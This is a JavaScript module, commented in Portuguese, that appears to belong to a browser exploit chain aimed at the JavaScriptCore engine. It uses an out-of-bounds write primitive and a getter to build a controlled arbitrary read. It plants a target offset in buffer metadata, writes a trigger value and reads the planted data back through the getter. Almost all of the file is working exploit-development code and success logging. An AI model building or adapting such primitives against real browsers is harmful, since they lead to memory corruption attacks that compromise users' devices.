// js/script3/testArrayBufferVictimCrash.mjs (Re-tentativa Getter para Leitura Arbitrária Controlada)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v2_Reattempt";

// Constantes
const ADDR_PART_LOW_PLANT_OFFSET = 0x6C;         // Onde plantamos a parte baixa do "endereço/offset"
const ADDR_PART_HIGH_PLANT_OFFSET = 0x68;        // Onde plantamos a parte alta do "endereço/offset"
                                                // O getter lerá o QWORD de 0x68.
const TRIGGER_WRITE_OFFSET = 0x70;
const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;

const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100;
const TARGET_DATA_LOCATION_IN_OOB = 0x0200;     // Endereço (offset) DENTRO do oob_array_buffer_real que queremos ler
const TARGET_DATA_VALUE_LOW = 0xCAFEFEED;       // Dados diferentes para este teste
const TARGET_DATA_VALUE_HIGH = 0xBEADFACE;

// Offsets para reconfigurar o oob_dataview_real (metadados do oob_dataview_real estão em 0x58)
const OOB_DV_M_VECTOR_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
const OOB_DV_M_LENGTH_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70
// const OOB_DV_M_MODE_OFFSET   = 0x58 + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;   // 0x74


let getter_object_ref = null;
let address_used_by_getter_for_read = null; 
let data_successfully_read_and_copied_by_getter = false;

function ArbReadGetterReattempt() {
    logS3(`>>>> [ArbReadGetterReattempt ACIONADO!] <<<<`, "vuln", `${FNAME_MODULE_V28}.Getter`);
    data_successfully_read_and_copied_by_getter = false;
    address_used_by_getter_for_read = null;

    try {
        // 1. Getter lê o QWORD de 0x68. Esperamos que contenha o endereço/offset para ler.
        const qword_address_target = oob_read_absolute(ADDR_PART_HIGH_PLANT_OFFSET, 8); // Lê de 0x68
        if (!isAdvancedInt64Object(qword_address_target)) {
             logS3(`    [GetterArbV2] Valor lido de ${toHex(ADDR_PART_HIGH_PLANT_OFFSET)} não é AdvancedInt64.`, "error", `${FNAME_MODULE_V28}.Getter`);
             return "getter_error_reading_addr_qword";
        }
        address_used_by_getter_for_read = qword_address_target;
        logS3(`    [GetterArbV2] Endereço Alvo para Leitura (lido de ${toHex(ADDR_PART_HIGH_PLANT_OFFSET)}): ${address_used_by_getter_for_read.toString(true)}`, "leak", `${FNAME_MODULE_V28}.Getter`);

        // 2. Reconfigurar o oob_dataview_real para apontar para este endereço lido
        // Não vamos mais escrever nos metadados do oob_dataview_real (0x58 em diante) aqui,
        // pois isso é o que o `triggerOOB_primitive` já faz para o oob_dataview_real principal.
        // Em vez disso, vamos criar um NOVO DataView temporário que usa o oob_array_buffer_real,
        // mas com o offset e length baseados no endereço que o getter leu.
        // Ou, se address_used_by_getter_for_read for um offset DENTRO de oob_array_buffer_real,
        // podemos usar o oob_read_absolute diretamente.

        // Para este teste, vamos assumir que address_used_by_getter_for_read.low() é o offset
        // e address_used_by_getter_for_read.high() deve ser 0.
        const target_offset = address_used_by_getter_for_read.low();
        const target_offset_high = address_used_by_getter_for_read.high();

        if (target_offset_high === 0 && target_offset < oob_array_buffer_real.byteLength - 8) { // Verifica se o offset é válido
            logS3(`    [GetterArbV2] Offset alvo (${toHex(target_offset)}) parece válido. Tentando ler dados de lá via oob_read_absolute...`, "info", `${FNAME_MODULE_V28}.Getter`);
            
            const data_read_from_target = oob_read_absolute(target_offset, 8); // Ler QWORD
            logS3(`    [GetterArbV2] Dados lidos de oob_array_buffer_real[${toHex(target_offset)}]: ${isAdvancedInt64Object(data_read_from_target) ? data_read_from_target.toString(true) : "ERRO_LEITURA_DADOS"}`, "leak", `${FNAME_MODULE_V28}.Getter`);

            // 4. Copiar os dados lidos para DATA_COPY_DEST_OFFSET_IN_OOB
            oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_from_target, 8);
            data_successfully_read_and_copied_by_getter = true;
            logS3(`    [GetterArbV2] Dados lidos copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}.`, "info", `${FNAME_MODULE_V28}.Getter`);
        } else {
            logS3(`    [GetterArbV2] Endereço alvo lido (${address_used_by_getter_for_read.toString(true)}) não é um offset simples válido (high part não é 0 ou offset muito grande).`, "warn", `${FNAME_MODULE_V28}.Getter`);
        }

    } catch (e) {
        logS3(`    ERRO DENTRO DO ArbReadGetterReattempt: ${e.name} - ${e.message}\n${e.stack}`, "critical", `${FNAME_MODULE_V28}.Getter`);
    }
    return "arb_read_getter_v2_executed";
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptArbitraryReadV2`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Re-Tentativa de Leitura Arbitrária Controlada via Getter ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    address_used_by_getter_for_read = null;
    data_successfully_read_and_copied_by_getter = false;
    getter_object_ref = {};

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        address_targeted_by_getter_str: null,
        data_planted_at_target_str: null,
        copied_data_str: null,
        message: "Teste não iniciado."
    };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init falhou ou ambiente não está pronto."); 
        }
        logS3("Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);

        // PASSO 1a: Plantar dados de teste em TARGET_DATA_LOCATION_IN_OOB (0x200)
        const target_data_to_plant = new AdvancedInt64(TARGET_DATA_VALUE_LOW, TARGET_DATA_VALUE_HIGH);
        exploit_result.data_planted_at_target_str = target_data_to_plant.toString(true);
        logS3(`PASSO 1a: Plantando dados de teste ${exploit_result.data_planted_at_target_str} em oob_buffer[${toHex(TARGET_DATA_LOCATION_IN_OOB)}]`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_DATA_LOCATION_IN_OOB, target_data_to_plant, 8);

        // PASSO 1b: Plantar o OFFSET (TARGET_DATA_LOCATION_IN_OOB) em ADDR_PART_LOW_PLANT_OFFSET (0x6C)
        // e algo em ADDR_PART_HIGH_PLANT_OFFSET (0x68) para que o getter leia um QWORD conhecido de 0x68.
        // Queremos que o getter leia de 0x68 o valor AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0)
        // para que target_offset = TARGET_DATA_LOCATION_IN_OOB e target_offset_high = 0.
        const qword_for_getter_to_read = new AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0);
        logS3(`PASSO 1b: Plantando QWORD ${qword_for_getter_to_read.toString(true)} diretamente em oob_buffer[${toHex(ADDR_PART_HIGH_PLANT_OFFSET)}] (0x68)`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(ADDR_PART_HIGH_PLANT_OFFSET, qword_for_getter_to_read, 8); 
        // A escrita em 0x6C não é mais o foco principal para o que o getter lê, pois o getter lê de 0x68.
        // O trigger em 0x70 pode ainda ser necessário para acionar o getter.
        
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0,0), 8); // Limpar local de cópia

        Object.defineProperty(getter_object_ref, 'triggerReadV2', {
            get: ArbReadGetterReattempt,
            configurable: true
        });
        logS3("PASSO 2: Getter 'triggerReadV2' definido.", "info", FNAME_CURRENT_TEST);

        // PASSO 3: Escrita OOB de trigger em TRIGGER_WRITE_OFFSET (0x70) - Isso ainda aciona o getter?
        logS3(`PASSO 3: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4);
        logS3(`  Escrita de trigger realizada.`, "info", FNAME_CURRENT_TEST);

        // Adicionar log para ver o que está em 0x68 ANTES de acionar o getter, mas APÓS o trigger
        const val_at_0x68_post_trigger = oob_read_absolute(ADDR_PART_HIGH_PLANT_OFFSET, 8);
        logS3(`  Valor em 0x68 (lido por oob_read_absolute) APÓS trigger e ANTES do getter: ${isAdvancedInt64Object(val_at_0x68_post_trigger) ? val_at_0x68_post_trigger.toString(true) : "Erro"}`, "important");


        logS3("PASSO 4: Tentando acionar o getter acessando getter_object_ref.triggerReadV2...", "warn", FNAME_CURRENT_TEST);
        try {
            const getter_return_value = getter_object_ref.triggerReadV2;
            logS3(`  Acesso à propriedade do getter retornou: ${getter_return_value}`, "info", FNAME_CURRENT_TEST);
        } catch (e_getter_access) {
            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
        }

        exploit_result.address_targeted_by_getter_str = address_used_by_getter_for_read ? address_used_by_getter_for_read.toString(true) : "N/A";

        if (data_successfully_read_and_copied_by_getter) {
            const copied_data = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
            exploit_result.copied_data_str = isAdvancedInt64Object(copied_data) ? copied_data.toString(true) : "ERRO_LEITURA_COPIA";
            logS3(`PASSO 5: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}: ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);

            if (isAdvancedInt64Object(copied_data) && copied_data.equals(target_data_to_plant)) {
                exploit_result.success = true;
                exploit_result.message = "SUCESSO! Getter leu o endereço/offset alvo de 0x68, leu dados e copiou corretamente!";
                document.title = `${FNAME_MODULE_V28}: ARB.READ OK!`;
                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                exploit_result.message = "Dados copiados, mas não correspondem aos dados originais plantados.";
                document.title = `${FNAME_MODULE_V28}: Cópia Incorreta`;
            }
        } else {
            exploit_result.message = "Getter foi acionado, mas os dados não foram marcados como lidos/copiados com sucesso.";
            logS3(`  Getter acionado, mas 'data_successfully_read_and_copied_by_getter' é false. Endereço/Offset alvo que o getter usou: ${exploit_result.address_targeted_by_getter_str}`, "warn", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha na Leitura/Cópia`;
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Leitura Arbitrária (Re-tentativa): Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Alvo Lido pelo Getter (de 0x68): ${exploit_result.address_targeted_by_getter_str}`, "info", FNAME_CURRENT_TEST);
        if(exploit_result.copied_data_str) logS3(`  Dados Copiados (de ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
        getter_object_ref = null;
    }
    
    return { 
        errorOccurred: errorCapturedMain, 
        exploit_attempt_result: exploit_result,
        toJSON_details: { 
            probe_variant: FNAME_MODULE_V28, 
            this_type_in_toJSON: (exploit_result.success ? "getter_arb_read_success" : "getter_arb_read_failed"),
        }
    };
}
